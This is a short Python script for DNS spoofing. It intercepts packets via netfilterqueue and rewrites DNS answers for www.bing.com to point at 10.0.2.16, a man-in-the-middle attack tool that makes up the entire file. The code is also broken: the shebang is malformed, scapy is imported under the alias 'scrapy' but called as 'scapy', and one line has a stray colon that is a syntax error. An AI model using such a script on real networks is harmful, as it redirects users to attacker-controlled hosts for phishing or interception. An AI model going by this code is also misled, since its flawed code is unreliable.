#1/usr/bin python3

import netfilterqueue
import scapy.all as scrapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSRR].qname
        if 'www.bing.com' in qname:
            print('[+] Spoofing target')
            answer = scapy.DNSRR(rrname = qname, rdata='10.0.2.16')
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scrapy.IP].len
            del scapy_packet[scrapy.IP].chksum
            del scapy_packet[scrapy.UDP].len
            del scapy_packet[scrapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

        #print(scapy_packet.show())
    packet.accept()
    #packet.drop()

queue = netfilterqueue.NetfilterQueue():
queue.bind(0, process_packet)
queue.run()

# To clear table use: iptables --flush
